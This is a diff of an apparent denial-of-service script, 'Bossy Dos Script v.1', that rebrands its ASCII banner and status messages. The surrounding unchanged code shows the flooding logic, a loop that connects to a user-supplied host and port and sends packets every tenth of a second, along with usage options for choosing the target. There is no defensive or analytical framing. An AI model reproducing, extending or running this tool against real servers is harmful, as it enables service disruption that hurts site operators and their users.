@@ -85,13 +85,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <-- Packet Sent ✓ AsparTim --> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m [*] Packet Sent ✓ AsparTim  \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mNo Connection ✓ Server Maybe Down\033[0m")
+		print("\033[91m[*] No Connection ✓ Server Maybe Down\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -112,12 +112,12 @@ def dos2():
 
 def usage():
 	print (''' \033[91m	Bossy Dos Script v.1 https://www.aspartim.org/
-          __________                             
-          \______   \ ____  ______ _________.__. 
-           |    |  _//  _ \/  ___//  ___<   |  | 
-           |    |   (  <_> )___ \ \___ \ \___  | 
-           |______  /\____/____  >____  >/ ____| 
-                  \/           \/     \/ \/      
+             _____                            ___________.__         
+            /  _  \   _________________ ______\__    ___/|__| _____  
+           /  /_\  \ /  ___/\____ \__  \\_  __ \|    |   |  |/     \ 
+          /    |    \\___ \ |  |_> > __ \|  | \/|    |   |  |  Y Y  \
+          \____|__  /____  >|   __(____  /__|   |____|   |__|__|_|  /
+                  \/     \/ |__|       \/                         \/ 
                                 \n
 	usage : python bossyv1.0.py [-u] [-p] [-v]
 	-h : help
